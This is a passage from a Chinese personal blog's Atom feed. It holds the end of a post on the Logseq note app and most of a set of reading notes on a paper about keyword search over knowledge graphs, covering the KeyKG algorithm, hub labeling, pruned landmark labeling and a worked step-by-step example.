data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/12/KG.PNG" alt="Logseq 图谱示例" /><figcaption>Logseq 图谱示例</figcaption></figure><p>近期，新版的幕布也上线了 <code>@文件名</code> 引用不同的笔记，想必也是受到类似应用的启发。</p><p>由此可见，笔记软件正在从内联走向外联，越来越符合对知识整理的需求。</p><h1 id="不足">不足</h1><p>目前来说，Logseq 还存在许多不足：</p><ul><li>Logseq 还处在快速迭代阶段，很多功能存在不稳定的可能；</li><li>相关的文档稀少，对新手不太友好；</li></ul><p>但我相信，开源社区的支持会使得它更加完善。</p>]]></content>
        <author>
            <name><![CDATA[CosmosNing的个人博客]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://cosmosning.github.io/2020/10/08/notes-of-keyword-search-knowledge-2020/</id>
        <title><![CDATA[Keyword Search over Knowledge Graphs via Static and Dynamic Hub Labelings 阅读笔记]]></title>
        <updated>2020-12-13T06:40:34+08:00</updated>
        <link href="https://cosmosning.github.io/2020/10/08/notes-of-keyword-search-knowledge-2020/"/>
        <content type="text/html" src="https://cosmosning.github.io/2020/10/08/notes-of-keyword-search-knowledge-2020/"><![CDATA[<h1 id="highlights">Highlights</h1><ul><li><strong>Static Hub Labelings</strong></li><li><strong>Dynamic Hub Labelings</strong></li></ul><h1 id="what">What？</h1><h2 id="problem">Problem</h2><p>一种常见的图数据上的关键词查询的方法是，将每一个关键词与图上的一个顶点匹配，并且从中抽取出包含这些匹配顶点的最小权重的树（这种树被称为 <em>minimum-weight Steiner trees</em>）。更规范地说，给定一个有权边的数据图和一个关键词查询，首先对于每一个关键词，在图中找到与之匹配的所有顶点，形成一个匹配集；然后，在图中找到一个扩展匹配集的树，该树对于每一个匹配集，至少包含其中的一个顶点，并且总边权重最小。这个优化问题叫做 <em>group Steiner tree (GST) problem</em> 。</p><div class="note info"><p>数据图中的边也可以被关键词匹配。我们可以通过 <em>graph subdivision</em> 将边匹配转换为点匹配，之后使用点匹配的方式处理该匹配就行了。</p></div><h2 id="contributions">Contributions</h2><ul><li>设计了一个质量有保证的近似算法，能够在毫秒级内，从百万级大小的知识图谱中返回不错的结果。</li><li>设计了动态、静态 HL，提高了总体的效率。</li></ul><h1 id="why">Why？</h1><p>知识图谱越来越大，现存的算法太慢了。</p><h1 id="how">How？</h1><h2 id="problem-formulation">Problem Formulation</h2><ul><li><strong>知识图谱（<em>KG</em>）</strong>：规范的，知识图谱是一个简单的无向图 <span class="math inline">\(G=&lt;V,E&gt;\)</span> ，其中 <span class="math inline">\(V\)</span> 是包含 <span class="math inline">\(n\)</span> 个顶点的有限集合，用来指代实体（<em>entity</em>），而 <span class="math inline">\(E\subseteq V\times V\)</span> 是顶点无序对的有限集合，作为图的无向边，用来代表实体之间的关系（<em>relation</em>）。<ul><li><strong>边权重</strong>：定义一个权重函数 <span class="math inline">\(\textrm{wt}:E\mapsto \mathbb{R}^{0+}\)</span> （<strong>小权重表示重要性大</strong>）。</li></ul></li><li><strong>图中术语</strong><ul><li><span class="math inline">\(\textrm{len}(p)\)</span> ：对于一条路径 <span class="math inline">\(p\)</span> ，它的<strong>长度</strong>是路径中所有边的权重之和。</li><li><span class="math inline">\(\textrm{dist}(u,v)\)</span> ：在图 <span class="math inline">\(G\)</span> 中，连接 <span class="math inline">\(u\)</span> 、<span class="math inline">\(v\)</span> 的<strong>最短路径的长度</strong>。如果不存在，那么为 <span class="math inline">\(\infty\)</span> 。</li></ul></li><li><strong>关键词映射</strong>：定义一个获取函数 <span class="math inline">\(\textrm{hits}:\mathbb{K}\mapsto 2^V\)</span> ，它将关键词映射到顶点集 <span class="math inline">\(V\)</span> 的子集。</li><li><strong>关键词查询</strong>：一个<strong>关键词查询</strong> <span class="math inline">\(Q\subseteq \mathbb{K}\)</span> 是一个关键词的有限集合。<ul><li>给定一个含有 <span class="math inline">\(g\)</span> 个关键词的查询 <span class="math inline">\(Q=\{k_1,k_2,\dots,\ k_g\}\)</span> ，将 <span class="math inline">\(\textrm{hits}(k_i)\)</span> 简记为 <span class="math inline">\(K_i\)</span> （<span class="math inline">\(1\le i\le g\)</span>），并称之为<strong>关键词顶点</strong>。</li><li>给定一个图 <span class="math inline">\(G=&lt;V,E&gt;\)</span> ，在 <span class="math inline">\(G\)</span> 上关于 <span class="math inline">\(Q\)</span> 的结果是一个 <em>group Steiner tree (GST)</em> ，记作 <span class="math inline">\(T=&lt;V_T,E_T&gt;\)</span> ，满足以下条件<ul><li><span class="math inline">\(V_T\subseteq V,E_T\subseteq E\)</span> ，并且 <span class="math inline">\(T\)</span> 是一棵树；</li><li><span class="math inline">\(V_T\)</span> 包含来自每一个 <span class="math inline">\(K_i\)</span> （<span class="math inline">\(1\le i\le g\)</span>）中的至少一个顶点，也就是 <span class="math inline">\(V_T\cap K_i \ne \emptyset\)</span> ；</li><li>树的权重（定义为 <span class="math inline">\(\textrm{WT}(T)=\sum_{e\in E_T}\textrm{wt}(e)\)</span>）最小</li></ul></li></ul></li></ul><h2 id="overview-of-two-algorithm">Overview of Two Algorithm</h2><p>第一个算法 <em>KeyKG</em> 为每一个关键词选取匹配的顶点，并且找到对应的树。对于 <span class="math inline">\(g\)</span> 个关键词，<em>KeyKG</em> 是一个 <span class="math inline">\((g-1)\)</span> - 近似算法，也就是说，一个 GST 的边权值的总和至多是最小权重的 <span class="math inline">\((g-1)\)</span> 倍。获得这样的近似效果要归功于匹配顶点集的选择和利用最短路径树的构造。为了更高效的在线计算距离和最短路径，该文章设计了一个 HL ，这个 HL 使用了一种全新的基于 <em>betweenness centrality</em> 的启发式方法改善了现存的 <em>pruned landmark labeling</em> 。传统的，这种 HL 是静态的，因为它是离线生成的，并且对查询是不变的。在巨大的知识图谱中， 使用静态 HL 的 <em>KeyKG</em> 算法至少比目前先进的算法快一个数量级，并且所得结果的质量也较高。</p><p>第二个算法 <em>KeyKG+</em> 通过使用一种新颖的 HL 扩展了 <em>KeyKG</em> 算法。这里所提出的 HL 是动态的，因为它是在处理一个具体的查询时，通过倒排和聚集某些查询相关的静态标签，而动态生成的。它减少了 KeyKG 算法中的重复操作（这些重复操作是指使用传统静态 HL 计算顶点集的距离）。尽管在线生成会花费额外的时间，使用动态 HL 为总体效率带来了几个数量级的提高。</p><h2 id="keykg-with-static-hl">KeyKG With Static HL</h2><h3 id="algorithm-keykg">Algorithm KeyKG</h3><h4 id="algorithm-explained">Algorithm Explained</h4><p>如下图<strong>算法 1</strong> 所示，<em>KeyKG</em> 在知识图谱中找到一个 <em>GST</em> ，这个 <em>GST</em> 是由 <span class="math inline">\(g\)</span> 个关键词集合扩展而来。简而言之， <em>KeyKG</em> 首先贪婪地选择一组相互靠近的一组关键词顶点集合（记作 <span class="math inline">\(U_x\)</span>），这组关键词顶点集合包含了来自每一个 <span class="math inline">\(K_i\)</span> （<span class="math inline">\(1\le i\le g\)</span>）中的一个顶点（<strong>Line 1 - 8</strong>）。然后，<em>KeyKG</em> 贪婪地找到一个由 <span class="math inline">\(U_x\)</span> 扩展而来的 <em>GST</em> （记作 <span class="math inline">\(T_{u_{min}}\)</span>），这个过程是通过迭代地扩展最短路径而得到的（<strong>Line 9 - 18</strong>）。</p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/Algo1.PNG" alt="算法 1" /><figcaption>算法 1</figcaption></figure><p>具体的，对于每一个 <span class="math inline">\(v_1 \in K_1\)</span> （<strong>Line 1</strong>），<em>KeyKG</em> 从每一个 <span class="math inline">\(K_i\)</span> 找到一个顶点 <span class="math inline">\(v_i\)</span> ，它距离 <span class="math inline">\(v_1\)</span> 的距离最短（<strong>Line 2 - 4</strong>）。令 <span class="math inline">\(U_{v_1}\)</span> 为所有这样的顶点 <span class="math inline">\(v_i\)</span> （包括 <span class="math inline">\(v_1\)</span>）的的集合，并且令 <span class="math inline">\(W_{v_1}\)</span> 为它们到 <span class="math inline">\(v_1\)</span> 的距离之和（<strong>Line 5 - 6</strong>）。令 <span class="math inline">\(x\in K_1\)</span> 为 <span class="math inline">\(K_1\)</span> 中 <span class="math inline">\(W_{v_1}\)</span> 最小的顶点（<strong>Line 8</strong>）。</p><div class="note info"><p><strong>扩展 <span class="math inline">\(U_x\)</span> 所得到的 GST 可能有较小的权重</strong></p><ul><li>因为 <span class="math inline">\(U_x\)</span> 包含了来自每一个 <span class="math inline">\(K_i\)</span> （<span class="math inline">\(1\le i\le g\)</span>）中的一个顶点，并且这些顶点相对而言十分接近，所以扩展 <span class="math inline">\(U_x\)</span> 所得到的 GST 可能有较小的权重。</li></ul></div><p><strong>算法 1</strong> 剩下的部分以每一个 <span class="math inline">\(u\in U_x\)</span> 构造一个 <em>GST</em> <span class="math inline">\(T_u\)</span> ，并且从这 <span class="math inline">\(|U_x|\)</span> 棵 <em>GST</em> 中找出权重最小的那一个。具体的，每一棵 <span class="math inline">\(T_u\)</span> 被初始化为只含有一个单一的顶点 <span class="math inline">\(u\)</span> （<strong>Line 9 - 10</strong>）。然后，不断迭代直至 <span class="math inline">\(T_u\)</span> 扩展了 <span class="math inline">\(U_x\)</span> 中的所有顶点（<strong>Line 11</strong>）：从 <span class="math inline">\(T_u\)</span> 中选取一个点 <span class="math inline">\(s_{\textrm{min}}\)</span> ，从 <span class="math inline">\(U_x-T_u\)</span> 中选一个点 <span class="math inline">\(t_{\textrm{min}}\)</span> ，它们之间的距离最短（<strong>Line 12</strong>）。接着，找到 <span class="math inline">\(s_{\textrm{min}}\)</span> 和 <span class="math inline">\(t_{\textrm{min}}\)</span> 之间的最短路径，并将路径上的顶点和边加入 <span class="math inline">\(T_u\)</span> （<strong>Line 13 -14</strong>）。令 <span class="math inline">\(u_{\textrm{min}}\in U_x\)</span> 表示一个顶点，满足它所对应的 <span class="math inline">\(T_u\)</span> 的权重最小（<strong>Line 17</strong>）。最终 <em>KeyKG</em> 将 <span class="math inline">\(T_{u_\textrm{min}}\)</span> 作为结果返回。</p><div class="note default"><p><strong>算法 1 中的 <code>getD</code> 和 <code>getSP</code></strong></p><ul><li><code>getD</code> ：计算两个顶点之间的距离。</li><li><code>getSP</code>：计算两个顶点之间的最短路径。</li></ul></div><h4 id="running-example">Running Example</h4><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG 执行的例子" /><figcaption>KeyKG 执行的例子</figcaption></figure><p>举个例子，如上图，给定一个查询 <span class="math inline">\(Q=\{k_1,k_2,k_3\}\)</span> ，则 <span class="math inline">\(K_1=\{B,F\},\;K_2=\{E\},\;K_3=\{C,D\}\)</span> 。</p><ul><li>对于 <span class="math inline">\(B\in K_1\)</span> ，<span class="math inline">\(E\)</span> 必选；由于 <span class="math inline">\(\textrm{dist}(B,C) = 1 &lt; 1.6 = \textrm{dist}(B,D)\)</span> ，所以选择 <span class="math inline">\(C\)</span> 。故 <span class="math inline">\(U_B = \{B,E,C\}\)</span> 。</li><li>对于 <span class="math inline">\(B\in K_2\)</span> ，<span class="math inline">\(E\)</span> 必选；由于 <span class="math inline">\(\textrm{dist}(F,C) = 1.1 &lt; 1.7 = \textrm{dist}(F,D)\)</span> ，所以选择 <span class="math inline">\(C\)</span> 。故 <span class="math inline">\(U_B = \{F,E,C\}\)</span> 。</li></ul><p>下面计算各自的权重之和：</p><ul><li>对于 <span class="math inline">\(U_B\)</span> ，<span class="math inline">\(W_B=\textrm{dist}(B,E)+\textrm{dist}(B,C) = 0.8+1 = 1.8\)</span></li><li>对于 <span class="math inline">\(U_F\)</span> ，<span class="math inline">\(W_B=\textrm{dist}(F,E)+\textrm{dist}(F,C) = 0.9+1.1 = 2\)</span></li></ul><p>由于 <span class="math inline">\(W_B &lt; W_F\)</span> ，故 <span class="math inline">\(x = B\)</span> 。</p><p>接下来生成 <em>GST</em> ：</p><ul><li><span class="math inline">\(T_B\)</span><ul><li>初始化 <span class="math inline">\(T_B\)</span> 中仅有一个顶点 <span class="math inline">\(B\)</span></li><li>令 <span class="math inline">\(s_{\textrm{min}} = B\)</span> ，则 <span class="math inline">\(t_{\textrm{min}} = E\)</span> ，因为 <span class="math inline">\(\textrm{dist}(B,E) &lt; \textrm{dist}(B,C)\)</span></li><li>令 <span class="math inline">\(t_{\textrm{min}} = C\)</span> ，则 <span class="math inline">\(s_\textrm{min} = E\)</span> ，因为 <span class="math inline">\(dist(E,C) &lt; \textrm{dist}(B,C)\)</span></li><li>再求出相关最短距离的路径，将路径上的顶点和边加入 <span class="math inline">\(T_B\)</span> ，即可得到图 <strong>KeyKG 执行的例子</strong> 中的 <span class="math inline">\(T_B\)</span></li></ul></li><li><span class="math inline">\(T_E\)</span> ：类似 <span class="math inline">\(T_B\)</span> 分析可得</li><li><span class="math inline">\(T_C\)</span> ：类似 <span class="math inline">\(T_B\)</span> 分析可得</li></ul><h3 id="static-hl">Static HL</h3><h4 id="why-we-need-hub-labeling">Why we need Hub Labeling？</h4><p>由上述介绍可知，<em>KeyKG</em> 依赖于两个子函数 <code>getD</code> 和 <code>getSP</code> 。在巨大的知识图谱中，一种直观的在线的实现这些子函数的方法（例如 Dijkstra 算法）的执行时间太长了；另一方面，离线生成每对顶点之间的距离和最短路径的空间开销十分大。为了权衡时空开销，这篇文章使用了 Hub Labeling ，一种离线生成的索引结构。</p><h4 id="basic-concept">Basic Concept</h4><p>一个静态的 HL 是一个图上的离线生成的索引结构。规范的说，对于一个图 <span class="math inline">\(G=&lt;V,E&gt;\)</span> ，一个静态的 HL ，可以看作一个函数 <span class="math inline">\(L:V\mapsto 2^V\)</span> ，它将顶点映射到顶点的集合（称作 <em>hub</em>），并且满足下列条件：</p><ul><li><span class="math inline">\(\forall u,v\in V\)</span> ，并且 <span class="math inline">\(u，v\)</span> 在 <span class="math inline">\(G\)</span> 中是连通的，<span class="math inline">\(\exists h\in L(u)\cap L(v)\)</span> ，使得 <span class="math inline">\(h\)</span> 在 <span class="math inline">\(u,v\)</span> 之间的最短路径上</li></ul><div class="note info"><p>对于 <span class="math inline">\(\forall v\in V\)</span> ， <span class="math inline">\(L(v)\)</span> 称为顶点 <span class="math inline">\(v\)</span> 的<strong>标签</strong>。</p></div><h4 id="supporting-for-computing-getd-but-not-getsp">Supporting For Computing <code>getD</code> but not <code>getSP</code></h4><p>在标准的索引结构中，每一个 <span class="math inline">\(L(v)\)</span> 是一个列表，其中包含按标识符排序的 hubs 。对于每一个 <span class="math inline">\(h\in L(v)\)</span> ，<span class="math inline">\(\textrm{dist}(v,h)\)</span> 也会预先计算出来并保存。这样我们就可以通过如下公式计算 <code>getD</code> ： <span class="math display">\[\textrm{getD}(u,v)=\begin{cases}\underset{h\in L(u)\cap L(v)}{min} \textrm{dist}(u,h) + \textrm{dist}(v,h) &amp; L(u)\cap L(v) \ne \emptyset\\\infty &amp; L(u)\cap L(v) = \emptyset\\\end{cases}\]</span> 其中，<span class="math inline">\(\textrm{dist}(u,h)\)</span> 和 <span class="math inline">\(\textrm{dist}(v,h)\)</span> 分别存储在 <span class="math inline">\(L(u)\)</span> 和 <span class="math inline">\(L(v)\)</span> 中。</p><p>但是，无法计算 <code>getSP</code></p><h4 id="improvement-in-construction">Improvement in Construction</h4><p><strong>动机</strong></p><p>从 <span class="math inline">\(\textrm{getD}(u,v)\)</span> 计算公式来看，当索引标签较小时，<code>getD</code> 的在线计算会更快。但是，最小化索引标签的平均大小是一个 NP-Hard 问题，并且具有对数不可近似性（<em>logarithmic inapproximability</em>）。给定一个图，有很多不同的启发式的方法能够构建合理的较小的索引标签。在其他的方法中，<em>pruned landmark labeling</em> (PLL) 是一个非常热门的实现方法，它利用了 Dijkstra 算法，并且能够高效的剪枝达到缩小索引标签大小的目的。</p><p><strong>算法</strong></p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/Algo2.PNG" alt="Algorithm 2" /><figcaption>Algorithm 2</figcaption></figure><p>如<strong>算法 2</strong> 所示，标准的 PLL 基本流程是执行 Dijkstra 算法 <span class="math inline">\(n\)</span> 次，其中 <span class="math inline">\(n\)</span> 为顶点的个数（Line 3 - 24），并且在此过程中迭代地扩展顶点标签（Line 4，Line 12）。记 <span class="math inline">\(i\)</span> 次迭代后 <span class="math inline">\(v\)</span> 的标签为 <span class="math inline">\(L_i(v)\)</span> 。在第 <span class="math inline">\(i\)</span> 次迭代，Dijkstra 算法从一个不同的顶点 <span class="math inline">\(v_i\in V\)</span> 出发（Line 7），访问其他顶点并且计算它们与 <span class="math inline">\(v_i\)</span> 之间的距离，存储到 <span class="math inline">\(d\)</span> 中（Line 14 - 15），再将 <span class="math inline">\(v_i\)</span> 加入到它们的索引标签中。</p><div class="note info"><p><strong>关于剪枝</strong></p><ul><li>由于一些顶点 <span class="math inline">\(u\)</span> 没有被访问到，所以它们的标签可以剪掉。</li><li>当 <span class="math inline">\(u\)</span> 与 <span class="math inline">\(v_i\)</span> 的距离可由构造好的 <span class="math inline">\(L_{i-1}\)</span> 标签计算得到，也就是 Line 11 的条件为假，那么会发生剪枝。</li></ul></div><p><strong>改进：Betweenness Centrality</strong></p><p>我们的目标是能够做更多剪枝来提高整个系统的性能。具体的，我们想要迭代早期构造的索引标签能够支持计算更多对顶点之间的距离，这样在后期的迭代过程中，就可以更频繁地发生剪枝操作。直观地，这可以通过这种方式实现，即在 Dijkstra 算法迭代的早期，选择那些许多最短路径都经过的顶点作为起始顶点。为了实现这个想法，原始的 PLL 实现方式是利用一些启发式的方法，对这些起始顶点按照其度数降序排列，因为高度数的顶点更有可能出现在许多顶点对之间的最短路径上。与传统方法不同，我们基于 <em>betweenness centrality</em> 对它们降序排序。顶点 <span class="math inline">\(v\)</span> 的 <em>betweenness centrality</em> 定义如下： <span class="math display">\[\textrm{bc}(v)=\underset{s,\;t\in V\backslash\ \{v\}}{\sum}\frac{\sigma_{st}(v)}{\sigma_{st}}\]</span> 其中，<span class="math inline">\(\sigma_{st}\)</span> 表示顶点 <span class="math inline">\(s,\;t\)</span> 之间最短路径的个数，<span class="math inline">\(\sigma_{st}(v)\)</span> 表示上述路劲中经过顶点 <span class="math inline">\(v\)</span> 的。</p><div class="note info"><p><strong>图上任意两个顶点之间的最短路径不止一条</strong>，因为可能存在<strong>最小权值相等但是路径不同</strong>的情况。</p></div><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG 执行的例子" /><figcaption>KeyKG 执行的例子</figcaption></figure><div class="note default"><p>举个例子，如上图中的图。可以用 Floyd 算法计算出任意两顶点之间的最短距离和路径。之后依据这个信息和 <em>betweenness centrality</em> 的定义可得：</p><ul><li><span class="math inline">\(\textrm{bc}(A) = 7\)</span></li><li><span class="math inline">\(\textrm{bc}(B)=4\)</span></li><li><span class="math inline">\(\textrm{bc}(C)=\textrm{bc}(D)=\textrm{bc}(E)=\textrm{bc}(F)=0\)</span></li></ul><p>但是，论文中用了 [4] （<strong>TODO</strong>）中的近似算法来缩短计算时间。</p></div><p><strong>构造 Static HL 的例子</strong></p><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG 执行的例子" /><figcaption>KeyKG 执行的例子</figcaption></figure><p>假设图的结构如上图所示。</p><p>首先初始化 <span class="math inline">\(L_0(v)\)</span> ：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_0(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_0(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_0(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_0(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_0(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_0(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><p>接着按照 <em>betweenness centrality</em> 对顶点降序排序，顺序为 <strong>A, B, C, D, E, F</strong>；</p><hr /><p>进入第一次循环：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td></tr></tbody></table><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(d[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><strong>0</strong></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td></tr></tbody></table><p>PQ 优先队列为：</p><table><thead><tr class="header"><th style="text-align: center;">A</th><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">队头（队尾）</td><td style="text-align: center;"></td></tr></tbody></table><hr /><p>进入内层 while 循环，</p><p>从 PQ 中弹出 <span class="math inline">\(A\)</span> 赋给 <span class="math inline">\(u\)</span> ，即 <span class="math inline">\(u=A\)</span> ；</p><p>将 <span class="math inline">\(visit[u]\)</span> 置 1，则：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><strong>1</strong></td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td></tr></tbody></table><p>利用 <span class="math inline">\(L_0\)</span> 计算 <span class="math inline">\(\textrm{getD}(v_1,u)\)</span> ，即计算 <span class="math inline">\(\textrm{getD}(A,A)\)</span> 。由于 <span class="math inline">\(L_0(A)=\emptyset\)</span> ，故 <span class="math inline">\(L_0(A)\cap L_0(A) = \emptyset\)</span>，所以 <span class="math inline">\(\textrm{getD}(A,A) = \infty\)</span> （利用 <span class="math inline">\(\textrm{getD}\)</span> 的公式可得）。</p><p>由于 <span class="math inline">\(\textrm{d}[u] = \textrm{d}[A] = 0 &lt; \textrm{getD}(v_1,u)\)</span> ，故 Line 11 的条件满足，进入条件体。</p><p><span class="math inline">\(L_i(u)\leftarrow L_{i-1}(u)\cup\{v_i\}\)</span> ，使得索引变化为：</p><table><colgroup><col style="width: 42%" /><col style="width: 11%" /><col style="width: 11%" /><col style="width: 11%" /><col style="width: 11%" /><col style="width: 11%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(D)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(E)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(F)\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;"><span class="math inline">\(A(\textrm{dist} = 0, \textrm{pred}= A)\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td><td style="text-align: center;"><span class="math inline">\(\emptyset\)</span></td></tr></tbody></table><hr /><p>在接下来的对 <span class="math inline">\(u=A\)</span> 未被访问的邻居顶点执行操作。</p><p>访问第一个邻居 <span class="math inline">\(B\)</span> 后，<span class="math inline">\(d\)</span> 变化如下：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(d[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">0</td><td style="text-align: center;"><strong>0.6</strong></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td></tr></tbody></table><p>则有属于 <span class="math inline">\(L_1(B)\)</span> 的 <span class="math inline">\(A(\textrm{dist} = 0.6, \textrm{pred}= A)\)</span> ，同时 B 插入到 PQ 中。</p><p>类似的，有</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(d[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(d[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">0</td><td style="text-align: center;">0.6</td><td style="text-align: center;"><strong>0.4</strong></td><td style="text-align: center;"><strong>1</strong></td><td style="text-align: center;"><strong>0.3</strong></td><td style="text-align: center;"><span class="math inline">\(\infty\)</span></td></tr></tbody></table><p>属于 <span class="math inline">\(L_1(C)\)</span> 的 <span class="math inline">\(A(\textrm{dist} = 0.4, \textrm{pred}= A)\)</span></p><p>属于 <span class="math inline">\(L_1(D)\)</span> 的 <span class="math inline">\(A(\textrm{dist} = 1, \textrm{pred}= A)\)</span></p><p>属于 <span class="math inline">\(L_1(E)\)</span> 的 <span class="math inline">\(A(\textrm{dist} = 0.3, \textrm{pred}= A)\)</span></p><p>在所有 A 的邻居访问完后，PQ 变为</p><table><thead><tr class="header"><th style="text-align: center;">E</th><th style="text-align: center;">C</th><th style="text-align: center;">B</th><th style="text-align: center;">D</th><th style="text-align: center;"><code>NULL</code></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">队头</td><td style="text-align: center;"></td><td style="text-align: center;"></td><td style="text-align: center;">队尾</td><td style="text-align: center;"></td></tr></tbody></table><p>然后，回到 <code>while</code> 循环。</p><hr /><p>PQ 弹出 E，置 <span class="math inline">\(visit\)</span> 为 1：</p><table><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(visited[A]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[B]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[C]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[D]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[E]\)</span></th><th style="text-align: center;"><span class="math inline">\(visited[F]\)</span></th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">1</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;">0</td><td style="text-align: center;"><strong>1</strong></td><td style="text-align: center;">0</td></tr></tbody></table><p>由于 <span class="math inline">\(\textrm{d}[u] = \textrm{d}[E] = 0.3 &lt; \textrm{getD}(v_1,u) = \textrm{getD}(A,E) = \infty\)</span> ，故 Line 11 的条件满足，进入条件体。</p><p><span class="math inline">\(L_i(u)\leftarrow L_{i-1}(u)\cup\{v_i\}\)</span> ，使得索引变化为：</p><table><colgroup><col style="width: 31%" /><col style="width: 8%" /><col style="width: 8%" /><col style="width: 8%" /><col style="width: 33%" /><col style="width: 8%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><span class="math inline">\(L_1(A)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(B)\)</span></th><th style="text-align: center;"><span class="math inline">\(L_1(C)\)</span></th><th 